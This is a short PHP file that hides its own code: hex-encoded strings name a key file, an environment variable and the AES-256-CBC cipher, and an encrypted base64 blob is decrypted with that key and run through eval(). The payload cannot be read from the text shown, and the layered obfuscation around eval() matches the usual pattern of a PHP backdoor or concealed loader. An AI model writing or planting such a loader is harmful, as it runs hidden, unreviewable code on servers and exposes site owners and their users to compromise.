<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('z9SXGC3kXfrFwkrmcPCqqQ==');
$c=base64_decode(
'kReyn20eauqBmIDerVFhvmoli4LrR+yTh0DjwxE7bPytkvFws8v8CD90IVoqZGOO5vnedJjk0IpO' .
'Hfzhi3JXdy/EDGdbiLxMw3BTONekBG1TuyIhWSeB98L2ebcYcX+Dglf7uf/LkWjCM1I7adQa+ajr' .
'hMlml6TzxWUWrHK6N43ahFRVsAizT6Bzfm67iRtIeyCxwn5x326ocdMECCxYHxEsI24PCf6y4V/3' .
'wl+z4XfBoynZBDGnUqcnOwrhqcUnaCi5r0zy+YBvHvM+Rsy2IEk0YSK4YZjvLwvAebvxe2yiShd6' .
'cT1/S2YJK0t5mxmvAcPBcvNs0rhNZe+HngOUjVdj1phJw3dzq6CpAhbSHWAwFo+z8X9CtiC+D5QQ' .
'c4FML5ui30ZjhND5db1vYD3lZl9spp4UAlSgN+uHCGYKWIt+Detf8xbC5GMKqg3SORwg9p0dmB//' .
'aC3Cxupe2/R5T/DvoqnqaKLcRPjqbm+WSQbiGSk9hVbqPB+1MDNaFcjou1m+t4Nufo43pP3uC4jw' .
'1ZJjyBDnAZesKIzKjGKa6bexwVQptFgX39j3S3U/HMl/pswTV7awOjYpGhMW6EwWAFDkjeilBEbo' .
'J3Qq3AmNDL8KoxFIRTaYMA0fhhLcYubwOCNlgG6BBpq9OmcTsC+hNB3efLkigRfq0fQ+fPUA27Tq' .
'3tNqwn8Jjz9Nf4GAb6rdSSd24UpkRsgVydDab4ZZ3Q=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
